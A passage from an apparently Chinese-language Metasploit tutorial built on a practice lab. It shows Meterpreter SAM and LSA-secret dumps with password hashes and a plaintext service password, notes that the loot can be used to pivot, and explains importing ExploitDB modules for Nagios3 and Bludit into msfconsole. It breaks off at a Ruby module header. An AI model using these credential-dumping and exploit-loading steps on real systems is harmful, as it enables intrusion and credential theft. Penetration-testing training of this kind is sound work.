class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">IUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::</span><br><span class="line">IWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::</span><br><span class="line">Lakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::</span><br><span class="line">SUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; lsa_dump_sam</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping SAM</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line">Local SID : S-1-5-21-1709780765-3897210020-3926566182</span><br><span class="line"></span><br><span class="line">SAMKey : 37ceb48682ea1b0197c7ab294ec405fe</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf</span><br><span class="line">  Hash NTLM: d6908f022af0373e9e21b8a241c86dca</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : SUPPORT_388945a0</span><br><span class="line">  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6</span><br><span class="line"></span><br><span class="line">RID  : 000003eb (1003)</span><br><span class="line">User : IUSR_GRANPA</span><br><span class="line">  Hash LM  : a274b4532c9ca5cdf684351fab962e86</span><br><span class="line">  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88</span><br><span class="line"></span><br><span class="line">RID  : 000003ec (1004)</span><br><span class="line">User : IWAM_GRANPA</span><br><span class="line">  Hash LM  : 95d112c4da2348b599183ac6b1d67840</span><br><span class="line">  Hash NTLM: a97f39734c21b3f6155ded7821d04d16</span><br><span class="line"></span><br><span class="line">RID  : 000003ef (1007)</span><br><span class="line">User : ASPNET</span><br><span class="line">  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b</span><br><span class="line">  Hash NTLM: edc0d5506804653f58964a2376bbd769</span><br><span class="line"></span><br><span class="line">RID  : 000003f1 (1009)</span><br><span class="line">User : Lakis</span><br><span class="line">  Hash LM  : f927b0679b3cc0e192410d9b0b40873c</span><br><span class="line">  Hash NTLM: 3064b6fc432033870c6730228af7867c</span><br></pre></td></tr></table></figure>

<h4 id="MSF-Meterpreter-LSA-秘密转储"><a href="#MSF-Meterpreter-LSA-秘密转储" class="headerlink" title="MSF - Meterpreter LSA 秘密转储"></a>MSF - Meterpreter LSA 秘密转储</h4><p> MSF - Meterpreter LSA 秘密转储</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lsa_dump_secrets</span><br><span class="line"></span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Dumping LSA secrets</span><br><span class="line">Domain : GRANNY</span><br><span class="line">SysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb</span><br><span class="line"></span><br><span class="line">Local name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )</span><br><span class="line">Domain name : HTB</span><br><span class="line"></span><br><span class="line">Policy subsystem is : 1.7</span><br><span class="line">LSA Key : ada60ee248094ce782807afae1711b2c</span><br><span class="line"></span><br><span class="line">Secret  : aspnet_WP_PASSWORD</span><br><span class="line">cur/text: Q5C&#x27;181g16D&#x27;=F</span><br><span class="line"></span><br><span class="line">Secret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV</span><br><span class="line">cur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 </span><br><span class="line"></span><br><span class="line">Secret  : DPAPI_SYSTEM</span><br><span class="line">cur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 </span><br><span class="line">    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line">    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63</span><br><span class="line"></span><br><span class="line">Secret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75</span><br><span class="line">cur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line"></span><br><span class="line">Secret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588</span><br><span class="line">cur/hex : 00 f2 d1 31 e2 11 d3 01 </span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d</span><br><span class="line"></span><br><span class="line">Secret  : L$&#123;6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A&#125;</span><br><span class="line">cur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f </span><br><span class="line">old/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 </span><br><span class="line"></span><br><span class="line">Secret  : NL$KM</span><br><span class="line">cur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f </span><br><span class="line"></span><br><span class="line">Secret  : SAC</span><br><span class="line"></span><br><span class="line">Secret  : SAI</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;148f1a14-53f3-4074-a573-e1ccd344e1d0&#125;</span><br><span class="line"></span><br><span class="line">Secret  : SCM:&#123;3D14228D-FBE1-11D0-995D-00C04FD919C1&#125;</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Alerter / service &#x27;Alerter&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_ALG / service &#x27;ALG&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_aspnet_state / service &#x27;aspnet_state&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dhcp / service &#x27;Dhcp&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_Dnscache / service &#x27;Dnscache&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LicenseService / service &#x27;LicenseService&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_LmHosts / service &#x27;LmHosts&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_MSDTC / service &#x27;MSDTC&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcLocator / service &#x27;RpcLocator&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_RpcSs / service &#x27;RpcSs&#x27; with username : NT AUTHORITY\NetworkService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_stisvc / service &#x27;stisvc&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_TlntSvr / service &#x27;TlntSvr&#x27; with username : NT AUTHORITY\LocalService</span><br><span class="line"></span><br><span class="line">Secret  : _SC_WebClient / service &#x27;WebClient&#x27; with username : NT AUTHORITY\LocalService</span><br></pre></td></tr></table></figure>

<p>从这一点来看，如果机器连接到更广泛的网络，我们可以使用这个战利品在系统中旋转，获得对内部资源的访问权限，并在网络的整体安全态势薄弱的情况下冒充具有更高访问权限的用户.</p>
<h2 id="编写和导入模块"><a href="#编写和导入模块" class="headerlink" title="编写和导入模块"></a>编写和导入模块</h2><p>要安装任何已经被其他用户移植过来的新 Metasploit 模块，可以选择<code>msfconsole</code>从终端更新它们，这将确保所有最新的漏洞、辅助工具和功能都将安装在最新版本的<code>msfconsole</code>. 只要移植的模块被推送到 GitHub 上的主要 Metasploit-framework 分支，我们就应该更新到最新的模块。</p>
<p>但是，如果我们只需要一个特定的模块并且不想执行完整升级，我们可以下载该模块并手动安装。我们将专注于在 ExploitDB 中搜索现成可用的 Metasploit 模块，我们可以将这些模块直接导入到我们的<code>msfconsole</code>本地版本中。</p>
<p>在搜索自定义漏洞时，<a target="_blank" rel="noopener" href="https://www.exploit-db.com/">ExploitDB是一个不错的选择。</a>我们可以使用标签来搜索每个可用脚本的不同利用场景。这些标签之一是<a target="_blank" rel="noopener" href="https://www.exploit-db.com/?tag=3">Metasploit Framework (MSF)</a>，如果选中，将仅显示 Metasploit 模块格式中也可用的脚本。这些可以直接从 ExploitDB 下载并安装在我们本地的 Metasploit Framework 目录中，从那里可以在<code>msfconsole</code>.</p>
<p><img src="/.com//%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6%5C3.png"></p>
<p>假设我们想使用为 找到的漏洞利用程序<code>Nagios3</code>，它将利用命令注入漏洞。我们正在寻找的模块是<code>Nagios3 - &#39;statuswml.cgi&#39; Command Injection (Metasploit)</code>. 所以我们启动<code>msfconsole</code>并尝试搜索那个特定的漏洞利用，但我们找不到它。这意味着我们的 Metasploit 框架不是最新的，或者<code>Nagios3</code>我们正在寻找的特定漏洞利用模块不在 Metasploit 框架的官方更新版本中。</p>
<h4 id="MSF-搜索漏洞"><a href="#MSF-搜索漏洞" class="headerlink" title="MSF - 搜索漏洞"></a>MSF - 搜索漏洞</h4><p> MSF - 搜索漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search nagios</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                          Disclosure Date  Rank       Check  Description</span><br><span class="line">   -  ----                                                          ---------------  ----       -----  -----------</span><br><span class="line">   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution</span><br><span class="line">   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution</span><br><span class="line">   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution</span><br><span class="line">   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution</span><br><span class="line">   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution</span><br><span class="line">   6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection</span><br><span class="line">   7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration</span><br></pre></td></tr></table></figure>

<p>但是，我们可以<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/9861">在 ExploitDB 的条目中</a>找到漏洞利用代码。或者，如果我们不想使用我们的网络浏览器在 ExploitDB 中搜索特定的漏洞，我们可以使用 CLI 版本，<code>searchsploit</code>.</p>
<p> MSF - 搜索漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit nagios3</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Remote Command Execution                                                                                             | multiple/remote/24084.py</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>请注意，以 结尾的托管文件终止符<code>.rb</code>是 Ruby 脚本，很可能是专门为在<code>msfconsole</code>. 我们还可以仅按<code>.rb</code>文件终止符进行过滤，以避免无法在<code>msfconsole</code>. 请注意，并非所有<code>.rb</code>文件都会自动转换为<code>msfconsole</code>模块。有些漏洞是用 Ruby 编写的，其中没有任何与 Metasploit 模块兼容的代码。我们将在以下小节中查看这些示例之一。</p>
<p> MSF - 搜索漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ searchsploit -t Nagios3 --exclude=&quot;.py&quot;</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                               |  Path</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Nagios3 - &#x27;history.cgi&#x27; Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; &#x27;Ping&#x27; Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb</span><br><span class="line">Nagios3 - &#x27;statuswml.cgi&#x27; Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb</span><br><span class="line">--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br></pre></td></tr></table></figure>

<p>我们必须下载<code>.rb</code>文件并将其放在正确的目录中。存储所有模块、脚本、插件和<code>msfconsole</code>专有文件的默认目录是<code>/usr/share/metasploit-framework</code>. 关键文件夹也在隐藏位置的主文件夹和根文件夹中进行了符号链接<code>~/.msf4/</code>。</p>
<h4 id="MSF-目录结构"><a href="#MSF-目录结构" class="headerlink" title="MSF - 目录结构"></a>MSF - 目录结构</h4><p> MSF - 目录结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/</span><br><span class="line"></span><br><span class="line">app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor</span><br><span class="line">config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts</span><br><span class="line">data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools</span><br></pre></td></tr></table></figure>

<p> MSF - 目录结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls .msf4/</span><br><span class="line"></span><br><span class="line">history  local  logos  logs  loot  modules  plugins  store</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/9861">我们下载好exploit</a>后拷贝到合适的目录下。请注意，我们的主文件夹<code>.msf4</code>位置可能不具有该文件夹可能具有的所有文件夹结构<code>/usr/share/metasploit-framework/</code>。因此，我们只需要<code>mkdir</code>适当的文件夹，使结构与原始文件夹相同，以便<code>msfconsole</code>可以找到新模块。之后，我们将继续将<code>.rb</code>脚本直接复制到主要位置。</p>
<p>请注意，某些命名约定如果没有得到充分遵守，将在尝试识别<code>msfconsole</code>我们安装的新模块时产生错误。始终使用蛇形、字母数字字符和下划线而不是破折号。</p>
<p>例如：</p>
<ul>
<li><code>nagios3_command_injection.rb</code></li>
<li><code>our_module_here.rb</code></li>
</ul>
<h4 id="MSF-在运行时加载附加模块"><a href="#MSF-在运行时加载附加模块" class="headerlink" title="MSF - 在运行时加载附加模块"></a>MSF - 在运行时加载附加模块</h4><p> MSF - 在运行时加载附加模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb</span><br><span class="line">vnswer77@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure>

<h4 id="MSF-加载附加模块"><a href="#MSF-加载附加模块" class="headerlink" title="MSF - 加载附加模块"></a>MSF - 加载附加模块</h4><p> MSF - 加载附加模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; loadpath /usr/share/metasploit-framework/modules/</span><br></pre></td></tr></table></figure>

<p>或者，我们也可以启动<code>msfconsole</code>并运行<code>reload_all</code>新安装的模块出现在列表中的命令。命令运行完没有报错后，要么试试<code>search [name]</code>里面的函数<code>msfconsole</code>，要么直接用<code>use [module-path]</code>直接跳转到新安装的模块。</p>
<p> MSF - 加载附加模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; reload_all</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/nagios3_command_injection </span><br><span class="line">msf6 exploit(unix/webapp/nagios3_command_injection) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/nagios3_command_injection):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting                 Required  Description</span><br><span class="line">   ----     ---------------                 --------  -----------</span><br><span class="line">   PASS     guest                           yes       The password to authenticate with</span><br><span class="line">   Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT    80                              yes       The target port (TCP)</span><br><span class="line">   SSL      false                           no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi</span><br><span class="line">   USER     guest                           yes       The username to authenticate with</span><br><span class="line">   VHOST                                    no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Target</span><br></pre></td></tr></table></figure>

<p>现在我们已准备好针对我们的目标启动它。</p>
<hr>
<h2 id="将脚本移植到-Metasploit-模块中"><a href="#将脚本移植到-Metasploit-模块中" class="headerlink" title="将脚本移植到 Metasploit 模块中"></a>将脚本移植到 Metasploit 模块中</h2><p>要将自定义 Python、PHP 或任何类型的漏洞利用脚本改编为 Metasploit 的 Ruby 模块，我们需要学习 Ruby 编程语言。请注意，Metasploit 的 Ruby 模块始终使用硬选项卡编写。</p>
<p>当开始移植项目时，我们不需要从头开始编码。相反，我们可以从我们的项目所属的类别中获取现有的漏洞利用模块之一，并将其重新用于我们当前的移植脚本。请记住始终保持我们的自定义模块井井有条，以便我们和其他渗透测试人员在搜索自定义模块时可以从干净、井井有条的环境中受益。</p>
<p>我们首先选择一些漏洞利用代码移植到 Metasploit。在此示例中，我们将使用<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48746">Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass</a>。我们需要下载脚本，<code>48746.rb</code>然后将其复制到<code>/usr/share/metasploit-framework/modules/exploits/linux/http/</code>文件夹中。如果我们现在启动<code>msfconsole</code>，我们将只能在与上面相同的文件夹中找到一个<code>Bludit CMS</code>漏洞，确认我们的漏洞还没有被移植过来。好消息是该文件夹中已经有一个 Bludit 漏洞，因为我们将把它用作我们新漏洞的样板代码。</p>
<h4 id="移植-MSF-模块"><a href="#移植-MSF-模块" class="headerlink" title="移植 MSF 模块"></a>移植 MSF 模块</h4><p> 移植 MSF 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit</span><br><span class="line"></span><br><span class="line">bludit_upload_images_exec.rb</span><br></pre></td></tr></table></figure>

<p> 移植 MSF 模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb</span><br></pre></td></tr></table></figure>

<p>在我们复制的文件的开头，也就是我们要填写信息的地方，我们可以注意到<code>include</code>样板模块开头的语句。这些是本节中提到的混合宏<code>Plugins and Mixins</code>，我们需要将它们更改为适合我们模块的混合宏。</p>
<p><a target="_blank" rel="noopener" href="https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf">如果我们想找到我们的模块工作所需的合适的 mixins、类和方法，我们将需要在rubydoc rapid7 文档</a>中查找不同的条目。</p>
<hr>
<h2 id="编写我们的模块"><a href="#编写我们的模块" class="headerlink" title="编写我们的模块"></a>编写我们的模块</h2><p>在特定评估期间，我们经常会面对运行专有代码以服务其客户的定制网络。我们手头的大多数模块甚至都没有在它们的周边留下凹痕，而且我们似乎无法用我们拥有的任何东西正确地扫描和记录目标。在这里，我们可能会发现重拾 Ruby 技能并开始编写模块代码很有帮助。</p>
<p><a target="_blank" rel="noopener" href="https://www.rubydoc.info/github/rapid7/metasploit-framework">有关 Metasploit Ruby 编码的所有必要信息都可以在Rubydoc.info Metasploit Framework</a>相关页面上找到。从扫描器到其他辅助工具，从定制的漏洞利用程序到移植的漏洞利用程序，用 Ruby 为框架编写代码是一项非常实用的技能。</p>
<p>请看下面一个类似的模块，我们可以将其用作漏洞利用移植的样板代码。这是<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/47699">Bludit 目录遍历图像文件上传漏洞</a>利用，已经导入到<code>msfconsole</code>. 在漏洞利用概念验证 ( ) 之前，花点时间了解模块中包含的所有不同字段<code>POC</code>。请注意，此代码在下面的代码片段中没有更改以适应我们当前的导入，而是上面提到的预先存在的模块的直接快照。这些信息将需要针对新的移植项目进行相应调整。</p>
<h4 id="概念验证-要求"><a href="#概念验证-要求" class="headerlink" title="概念验证 - 要求"></a>概念验证 - 要求</h4><p>代号：红宝石</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="comment"># This module requires Metasploit: https://metasploit.com/download</span></span><br><span class="line"><span class="comment"># Current source: https://github.com/rapid7/metasploit-framework</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Exploit::Remote</span></span><br><span class="line">  <span class="title class_">Rank</span> = <span class="title class_">ExcellentRanking</span></span><br><span class="line"></span><br><span 